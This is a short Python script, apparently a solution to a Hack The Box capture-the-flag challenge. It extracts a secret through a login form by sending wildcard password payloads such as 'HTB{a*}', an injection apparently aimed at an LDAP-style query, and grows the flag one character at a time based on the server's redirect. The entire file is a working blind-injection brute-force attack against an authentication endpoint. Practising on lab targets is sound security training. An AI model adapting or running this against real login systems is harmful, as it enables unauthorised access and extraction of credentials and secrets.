import requests
import string

url = "http://143.110.164.90:31628/login"
headers = {"UserAgent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36"}

chars = string.ascii_letters + string.digits + "~!@$%-_='" # excluded: #, *, ()

counter = 0
flag = "HTB{"

while True:
    if counter == len(chars): # pass all characters -> exit
        print("Full Flag:", flag + "}")
        break

    # payload like HTB{a*}
    password = flag + chars[counter] + "*}"

    data = {"username" : "Reese", "password" : password}
    response = requests.post(url, headers=headers, data=data)
    
    if (response.url != url + "?message=Authentication%20failed"): # success
        print("Find Flag:", password)
        flag += chars[counter]
        counter = 0
    else:
        counter += 1